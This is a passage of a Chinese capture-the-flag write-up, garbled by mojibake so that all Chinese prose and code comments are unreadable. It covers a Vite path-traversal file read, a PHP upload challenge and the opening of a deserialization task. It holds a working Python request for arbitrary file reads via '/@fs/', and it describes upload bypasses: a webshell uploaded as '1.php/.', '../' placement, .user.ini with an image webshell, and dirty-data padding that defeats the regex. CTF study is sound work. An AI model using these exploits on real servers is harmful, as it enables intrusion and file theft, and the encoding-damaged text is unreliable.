</span></span><span class="line"><span class="cl"><span class="c1"># æ›¿æ¢ä¸ºå®é™…çš„ PORT ç«¯å£</span>
</span></span><span class="line"><span class="cl"><span class="n">port</span> <span class="o">=</span> <span class="mi">59349</span>
</span></span><span class="line"><span class="cl"><span class="c1"># å®šä¹‰è¯·æ±‚ç›®æ ‡è·¯å¾„</span>
</span></span><span class="line"><span class="cl"><span class="n">request_target</span> <span class="o">=</span> <span class="s1">&#39;/@fs/app/#/../../../../../tgflagggg&#39;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># åˆ›å»º HTTP è¿æ¥</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span> <span class="o">=</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPConnection</span><span class="p">(</span><span class="n">ip</span><span class="p">,</span> <span class="n">port</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å‘èµ· GET è¯·æ±‚</span>
</span></span><span class="line"><span class="cl">    <span class="n">conn</span><span class="o">.</span><span class="n">request</span><span class="p">(</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="n">request_target</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è·å–å“åº”</span>
</span></span><span class="line"><span class="cl">    <span class="n">response</span> <span class="o">=</span> <span class="n">conn</span><span class="o">.</span><span class="n">getresponse</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è¯»å–å“åº”å†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="n">response</span><span class="o">.</span><span class="n">read</span><span class="p">()</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># æ‰“å°å“åº”çŠ¶æ€ç å’Œå†…å®¹</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;çŠ¶æ€ç : </span><span class="si">{</span><span class="n">response</span><span class="o">.</span><span class="n">status</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="n">http</span><span class="o">.</span><span class="n">client</span><span class="o">.</span><span class="n">HTTPException</span> <span class="k">as</span> <span class="n">http_err</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;HTTP å¼‚å¸¸: </span><span class="si">{</span><span class="n">http_err</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">except</span> <span class="ne">Exception</span> <span class="k">as</span> <span class="n">e</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="nb">print</span><span class="p">(</span><span class="sa">f</span><span class="s2">&#34;å‘ç”Ÿå…¶ä»–é”™è¯¯: </span><span class="si">{</span><span class="n">e</span><span class="si">}</span><span class="s2">&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">finally</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># å…³é—­è¿æ¥</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">conn</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">conn</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>å…·ä½“è¯¦ç»†è¯·çœ‹ä¸Šé¢æ‰€åˆ†äº«æ–‡ç« </p>
<p>æ‰¾æœ€æ–°cveè¿˜å¾—çœ‹<a class="link" href="https://avd.aliyun.com/search?q=vite&amp;timestamp__1384=eqAhY50IeGgYGQD%2F7RxBKT4GuO0DIhxAIedx"  target="_blank" rel="noopener"
    >é˜¿é‡Œäº‘æ¼æ´åº“</a></p>
<h3 id="ezupload"><strong>(ez)upload</strong>
</h3><p>æ‰«ææ²¡æ‰¾åˆ°æºç ï¼Œä½†æ˜¯çœ‹åˆ°index.php.bak,å¯ä»¥è”æƒ³åˆ°uploads.php.bakæºç å°±åœ¨å…¶ä¸­</p>
<img src="image-20250415143224931.png" alt="image-20250415143224931" style="zoom:50%;" />
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl"><span class="nx">define</span><span class="p">(</span><span class="s1">&#39;UPLOAD_PATH&#39;</span><span class="p">,</span> <span class="no">__DIR__</span> <span class="o">.</span> <span class="s1">&#39;/uploads/&#39;</span><span class="p">);</span> <span class="c1">// å®šä¹‰ä¸Šä¼ æ–‡ä»¶çš„å­˜å‚¨è·¯å¾„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">false</span><span class="p">;</span> <span class="c1">// åˆå§‹åŒ–æ–‡ä»¶ä¸Šä¼ çŠ¶æ€
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$msg</span> <span class="o">=</span> <span class="k">null</span><span class="p">;</span> <span class="c1">// åˆå§‹åŒ–æ¶ˆæ¯å˜é‡
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">200</span><span class="p">;</span> <span class="c1">// é»˜è®¤çŠ¶æ€ç ä¸º 200ï¼Œè¡¨ç¤ºæˆåŠŸ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;submit&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// æ£€æŸ¥æ˜¯å¦æäº¤äº†è¡¨å•
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="k">if</span> <span class="p">(</span><span class="nx">file_exists</span><span class="p">(</span><span class="nx">UPLOAD_PATH</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// æ£€æŸ¥ä¸Šä¼ è·¯å¾„æ˜¯å¦å­˜åœ¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$deny_ext</span> <span class="o">=</span> <span class="k">array</span><span class="p">(</span><span class="s2">&#34;php&#34;</span><span class="p">,</span> <span class="s2">&#34;php5&#34;</span><span class="p">,</span> <span class="s2">&#34;php4&#34;</span><span class="p">,</span> <span class="s2">&#34;php3&#34;</span><span class="p">,</span> <span class="s2">&#34;php2&#34;</span><span class="p">,</span> <span class="s2">&#34;html&#34;</span><span class="p">,</span> <span class="s2">&#34;htm&#34;</span><span class="p">,</span> <span class="s2">&#34;phtml&#34;</span><span class="p">,</span> <span class="s2">&#34;pht&#34;</span><span class="p">,</span> <span class="s2">&#34;jsp&#34;</span><span class="p">,</span> <span class="s2">&#34;jspa&#34;</span><span class="p">,</span> <span class="s2">&#34;jspx&#34;</span><span class="p">,</span> <span class="s2">&#34;jsw&#34;</span><span class="p">,</span> <span class="s2">&#34;jsv&#34;</span><span class="p">,</span> <span class="s2">&#34;jspf&#34;</span><span class="p">,</span> <span class="s2">&#34;jtml&#34;</span><span class="p">,</span> <span class="s2">&#34;asp&#34;</span><span class="p">,</span> <span class="s2">&#34;aspx&#34;</span><span class="p">,</span> <span class="s2">&#34;asa&#34;</span><span class="p">,</span> <span class="s2">&#34;asax&#34;</span><span class="p">,</span> <span class="s2">&#34;ascx&#34;</span><span class="p">,</span> <span class="s2">&#34;ashx&#34;</span><span class="p">,</span> <span class="s2">&#34;asmx&#34;</span><span class="p">,</span> <span class="s2">&#34;cer&#34;</span><span class="p">,</span> <span class="s2">&#34;swf&#34;</span><span class="p">,</span> <span class="s2">&#34;htaccess&#34;</span><span class="p">);</span> <span class="c1">// å®šä¹‰ç¦æ­¢ä¸Šä¼ çš„æ–‡ä»¶æ‰©å±•ååˆ—è¡¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="nx">isset</span><span class="p">(</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">]))</span> <span class="p">{</span> <span class="c1">// æ£€æŸ¥æ˜¯å¦é€šè¿‡ GET æ–¹æ³•ä¼ é€’äº†æ–‡ä»¶å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nv">$_GET</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">];</span> <span class="c1">// ä½¿ç”¨ GET æ–¹æ³•ä¼ é€’çš„æ–‡ä»¶å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$file_name</span> <span class="o">=</span> <span class="nx">basename</span><span class="p">(</span><span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="s1">&#39;name&#39;</span><span class="p">]);</span> <span class="c1">// ä½¿ç”¨ä¸Šä¼ æ–‡ä»¶çš„åŸå§‹æ–‡ä»¶å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$file_ext</span> <span class="o">=</span> <span class="nx">pathinfo</span><span class="p">(</span><span class="nv">$file_name</span><span class="p">,</span> <span class="nx">PATHINFO_EXTENSION</span><span class="p">);</span> <span class="c1">// è·å–æ–‡ä»¶æ‰©å±•å
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">in_array</span><span class="p">(</span><span class="nv">$file_ext</span><span class="p">,</span> <span class="nv">$deny_ext</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// æ£€æŸ¥æ–‡ä»¶æ‰©å±•åæ˜¯å¦åœ¨ç¦æ­¢åˆ—è¡¨ä¸­
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$temp_file</span> <span class="o">=</span> <span class="nv">$_FILES</span><span class="p">[</span><span class="s1">&#39;name&#39;</span><span class="p">][</span><span class="s1">&#39;tmp_name&#39;</span><span class="p">];</span> <span class="c1">// è·å–ä¸´æ—¶æ–‡ä»¶è·¯å¾„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$file_content</span> <span class="o">=</span> <span class="nx">file_get_contents</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">);</span> <span class="c1">// è¯»å–æ–‡ä»¶å†…å®¹
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="p">(</span><span class="nx">preg_match</span><span class="p">(</span><span class="s1">&#39;/.+?&lt;/s&#39;</span><span class="p">,</span> <span class="nv">$file_content</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// æ£€æŸ¥æ–‡ä»¶å†…å®¹æ˜¯å¦åŒ…å«éæ³•å­—ç¬¦ï¼ˆä½†æ˜¯å‡ºé¢˜è€…åº”è¯¥å‡ºé”™äº†ï¼Œæœ¬æ¥åº”è¯¥æ˜¯ /&lt;.+?&gt;/sï¼‰		#å› ä¸ºæ­£åˆ™è¡¨è¾¾å¼/.+?&lt;/sè¦æ±‚åŒ¹é…è‡³å°‘ä¸€ä¸ªå­—ç¬¦åè·Ÿ&lt;ï¼Œæ‰€ä»¥å¦‚æœæ–‡ä»¶å†…å®¹ä»¥&lt;å¼€å¤´ï¼Œåˆ™æ— æ³•æ»¡è¶³è¿™ä¸ªæ¨¡å¼ï¼Œå› æ­¤ä¸ä¼šè¢«æ£€æµ‹åˆ°ï¼Œä»è€Œç»•è¿‡æ£€æŸ¥ã€‚
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;æ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦ï¼Œç¦æ­¢ä¸Šä¼ ï¼&#39;</span><span class="p">;</span> <span class="c1">// æç¤ºæ–‡ä»¶å†…å®¹åŒ…å«éæ³•å­—ç¬¦
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// è®¾ç½®çŠ¶æ€ç ä¸º 403ï¼Œè¡¨ç¤ºç¦æ­¢è®¿é—®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                <span class="nv">$img_path</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="nv">$file_name</span><span class="p">;</span> <span class="c1">// æ„é€ ç›®æ ‡æ–‡ä»¶è·¯å¾„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="k">if</span> <span class="p">(</span><span class="nx">move_uploaded_file</span><span class="p">(</span><span class="nv">$temp_file</span><span class="p">,</span> <span class="nv">$img_path</span><span class="p">))</span> <span class="p">{</span> <span class="c1">// å°†ä¸Šä¼ çš„æ–‡ä»¶ç§»åŠ¨åˆ°ç›®æ ‡è·¯å¾„
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$is_upload</span> <span class="o">=</span> <span class="k">true</span><span class="p">;</span> <span class="c1">// è®¾ç½®æ–‡ä»¶ä¸Šä¼ çŠ¶æ€ä¸ºæˆåŠŸ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;æ–‡ä»¶ä¸Šä¼ æˆåŠŸï¼&#39;</span><span class="p">;</span> <span class="c1">// æç¤ºæ–‡ä»¶ä¸Šä¼ æˆåŠŸ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">                    <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;ä¸Šä¼ å‡ºé”™ï¼&#39;</span><span class="p">;</span> <span class="c1">// æç¤ºä¸Šä¼ å‡ºé”™
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                    <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">500</span><span class="p">;</span> <span class="c1">// è®¾ç½®çŠ¶æ€ç ä¸º 500ï¼Œè¡¨ç¤ºæœåŠ¡å™¨å†…éƒ¨é”™è¯¯
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>                <span class="p">}</span>
</span></span><span class="line"><span class="cl">            <span class="p">}</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$msg</span> <span class="o">=</span> <span class="s1">&#39;ç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶ï¼&#39;</span><span class="p">;</span> <span class="c1">// æç¤ºç¦æ­¢ä¿å­˜ä¸ºè¯¥ç±»å‹æ–‡ä»¶
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>            <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">403</span><span class="p">;</span> <span class="c1">// è®¾ç½®çŠ¶æ€ç ä¸º 403ï¼Œè¡¨ç¤ºç¦æ­¢è®¿é—®
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="nv">$msg</span> <span class="o">=</span> <span class="nx">UPLOAD_PATH</span> <span class="o">.</span> <span class="s1">&#39;æ–‡ä»¶å¤¹ä¸å­˜åœ¨,è¯·æ‰‹å·¥åˆ›å»ºï¼&#39;</span><span class="p">;</span> <span class="c1">// æç¤ºä¸Šä¼ è·¯å¾„ä¸å­˜åœ¨
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>        <span class="nv">$status_code</span> <span class="o">=</span> <span class="mi">404</span><span class="p">;</span> <span class="c1">// è®¾ç½®çŠ¶æ€ç ä¸º 404ï¼Œè¡¨ç¤ºèµ„æºæœªæ‰¾åˆ°
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="p">}</span>
</span></span><span class="line"><span class="cl"><span class="p">}</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è®¾ç½® HTTP çŠ¶æ€ç 
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">http_response_code</span><span class="p">(</span><span class="nv">$status_code</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// è¾“å‡ºç»“æœ
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="k">echo</span> <span class="nx">json_encode</span><span class="p">([</span> <span class="c1">// å°†ç»“æœä»¥ JSON æ ¼å¼è¾“å‡º
</span></span></span><span class="line"><span class="cl"><span class="c1"></span>    <span class="s1">&#39;status_code&#39;</span> <span class="o">=&gt;</span> <span class="nv">$status_code</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">    <span class="s1">&#39;msg&#39;</span> <span class="o">=&gt;</span> <span class="nv">$msg</span><span class="p">,</span>
</span></span><span class="line"><span class="cl"><span class="p">]);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="err">è¿™ä»£ç æœ€é‡è¦çš„æ˜¯</span><span class="n">move_uploaded_file</span><span class="p">(</span><span class="o">$</span><span class="n">temp_file</span><span class="p">,</span> <span class="o">$</span><span class="n">img_path</span><span class="p">)</span><span class="err">å‡½æ•°ï¼Œå°±ä¼šæŠŠä½ ä¸Šä¼ çš„æ–‡ä»¶ï¼ˆ</span><span class="o">$</span><span class="n">temp_file</span><span class="err">ï¼‰ï¼Œç§»åŠ¨åˆ°</span><span class="p">(</span><span class="o">$</span><span class="n">img_path</span><span class="p">)</span><span class="err">ï¼Œå¹¶æŠŠæ–‡ä»¶åä¿å­˜ä¸º</span><span class="p">(</span><span class="o">$</span><span class="n">file_name</span><span class="p">)</span><span class="err">ï¼Œåœ¨è¿™é‡Œå°±æ˜¯</span><span class="n">nameæ‰€ä¼ çš„å‚æ•°</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>è€Œä¸”è¿™é‡Œä¸€å®šè¦è¿›è¡Œnameä¼ å‚ï¼Œå› ä¸ºä»£ç æœ‰basename($_FILES[&rsquo;name&rsquo;][&rsquo;name&rsquo;]);</p>
<p>è¿™é‡Œæœ‰2ç§è§£æ³•</p>
<h4 id="ç¬¬ä¸€ç§æ‰“ä¸€å¥è¯æœ¨é©¬">ç¬¬ä¸€ç§ï¼šæ‰“ä¸€å¥è¯æœ¨é©¬
</h4><img src="image-20250415212139997.png" alt="image-20250415212139997" style="zoom:50%;" />
<p>è¿™é‡Œ/.æ˜¯ä¸ºäº†ç»•è¿‡pathinfoï¼Œé˜²æ­¢å…¶è·å–æ–‡ä»¶åç¼€ï¼Œè‡³äºä¸ºä»€ä¹ˆè¦a/../å…·ä½“å‚è€ƒ</p>
<p><a class="link" href="https://www.anquanke.com/post/id/103784"  target="_blank" rel="noopener"
    >ä»0CTFä¸€é“é¢˜çœ‹move_uploaded_fileçš„ä¸€ä¸ªç»†èŠ‚é—®é¢˜-å®‰å…¨KER - å®‰å…¨èµ„è®¯å¹³å°</a></p>
<p>æ‰“è¿›äº†æœ¨é©¬ä¹‹åå°±ä¸å¤šè¯´ã€‚</p>
<img src="image-20250415212216944.png" alt="image-20250415212216944" style="zoom:50%;" />
<p>è¿™é‡Œçš„phpæ–‡ä»¶æ˜¯åœ¨uploadsçš„æ–‡ä»¶ç›®å½•ä¸‹</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä½†æ˜¯ä¸Šé¢å…¶å®æ˜¯ä¸ºäº†è¿›è¡Œæ–‡ä»¶è¦†ç›–æ‰è¿™æ ·æ‰“ï¼Œå…·ä½“çœ‹ä¸Šæ–‡æ‰€åˆ†äº«æ–‡ç« ï¼Œæ–‡ç« é‡Œæ˜¯ä¸ºäº†è¦†ç›–index.php
</span></span></code></pre></td></tr></table>
</div>
</div><p>è¿™é‡Œæœ¬æ¥æ˜¯æ²¡æœ‰1.phpçš„ï¼Œæ‰€ä»¥å¯ä»¥ç›´æ¥æ‰“1.php/.</p>
<img src="image-20250415225556529.png" alt="image-20250415225556529" style="zoom:50%;" />
<img src="image-20250415225637767.png" alt="image-20250415225637767" style="zoom: 33%;" />
<p><strong>å¦‚æœä¼ ../1.php/.ï¼Œè¿™æ ·çš„è¯1.phpå°±æ˜¯ä¼ åœ¨ä¸ç½‘é¡µæ ¹ç›®å½•ä¸‹ï¼ˆå³ä¸uploadsæ–‡ä»¶å¤¹åŒä¸€ç›®å½•ï¼‰</strong></p>
<p><strong>è¿™ç§è§£æ³•è¿˜æœ‰ä¸€ç§å˜å½¢å°±æ˜¯.user.inié…åˆå›¾ç‰‡é©¬ï¼Œè¿™é‡Œå°±ä¸éœ€è¦/.ç»•è¿‡pathinfo</strong></p>
<img src="image-20250415213910006.png" alt="image-20250415213910006" style="zoom:50%;" />
<img src="image-20250415214007567.png" alt="image-20250415214007567" style="zoom:50%;" />
<img src="image-20250415230724993.png" alt="image-20250415230724993" style="zoom:50%;" />
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">ä¸ºä»€ä¹ˆè¦æ”¾åœ¨ä¸Šä¸€ä¸ªç›®å½•å‘¢ï¼Œå› ä¸ºåœ¨.user.ini ä¸­ä½¿ç”¨è¿™æ¡é…ç½®çš„ä½¿ç”¨ä¹Ÿè¯´äº†æ˜¯åœ¨åŒç›®å½•ä¸‹çš„å…¶ä»–.php æ–‡ä»¶ä¸­åŒ…å«é…ç½®ä¸­æ‰€æŒ‡å®šçš„æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯è¯´éœ€è¦è¯¥ç›®å½•ä¸‹å­˜åœ¨.php æ–‡ä»¶ã€‚
</span></span></code></pre></td></tr></table>
</div>
</div><p><a class="link" href="https://www.freebuf.com/articles/web/287193.html"  target="_blank" rel="noopener"
    >æµ…æ.htaccesså’Œ.user.iniæ–‡ä»¶ä¸Šä¼  - FreeBufç½‘ç»œå®‰å…¨è¡Œä¸šé—¨æˆ·</a>å…·ä½“çœ‹æ­¤æ–‡</p>
<h4 id="ç¬¬äºŒç§è„æ•°æ®ç»•è¿‡">ç¬¬äºŒç§ï¼šè„æ•°æ®ç»•è¿‡
</h4><p>åˆ©ç”¨å¤§é‡æ— ç”¨æ•°æ®ä½¿æ­£åˆ™å¤±æ•ˆï¼ˆå¦‚æœä¸é™åˆ¶å¤§å°çš„è¯ï¼Œæ˜¯ä¸ªå¾ˆå¥½çš„é€šè§£ï¼‰</p>
<img src="image-20250415223655058.png" alt="image-20250415223655058" style="zoom:50%;" />
<img src="image-20250415223953182.png" alt="image-20250415223953182" style="zoom: 33%;" />
<h3 id="ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ "><strong>ä»€ä¹ˆæ–‡ä»¶ä¸Šä¼ ï¼Ÿ</strong>
</h3><p>è®¿é—®class.phpæœ‰</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span><span class="lnt">72
</span><span class="lnt">73
</span><span class="lnt">74
</span><span class="lnt">75
</span><span class="lnt">76
</span><span class="lnt">77
</span><span class="lnt">78
</span><span class="lnt">79
</span><span class="lnt">80
</span><span class="lnt">81
</span><span class="lnt">82
</span><span class="lnt">83
</span><span class="lnt">84
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span>
</span></span><span class="line"><span class="cl">    <span class="nx">highlight_file</span><span class="p">(</span><span class="no">__FILE__</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="nx">error_reporting</span><span class="p">(</span><span class="mi">0</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">    <span class="k">function</span> <span class="nf">best64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nx">base64_decode</span><span class="p">(</span><span class="nv">$str</span><span class="p">)))));</span>
</span></span><span class="line"><span class="cl">    <span class="p">}</span>
</span></span><span class="line"><span class="cl">    <span class="k">class</span> <span class="nc">yesterday</span> <span class="p">{</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$learn</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$study</span><span class="o">=</span><span class="s2">&#34;study&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="nv">$try</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="k">public</span> <span class="k">function</span> <span class="fm">__construct</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">        <span class="p">{</span>
</span></span><span class="line"><span class="cl">            <span class="nv">$this</span><span class="o">-&gt;</span><span class="na">learn</span> <span class="o">=</span> <span class="s2">&#34;learn&lt;br&gt;&#34;</span><span class="p">;</span>
</span></span><span class="line"><span class="cl">        <span class="p">}</span>
